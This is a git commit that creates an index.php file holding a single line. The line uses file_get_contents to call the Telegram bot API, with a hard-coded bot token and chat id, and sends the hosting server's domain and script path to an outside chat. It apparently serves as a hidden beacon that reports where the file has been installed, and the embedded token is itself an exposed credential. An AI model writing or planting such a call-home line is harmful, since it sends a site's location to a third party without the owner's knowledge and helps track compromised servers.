2a253ae36b46373260f934e6ef86b927579c4dfe
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-10-15 22:00:46 +0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,1 @@
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001396771144&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
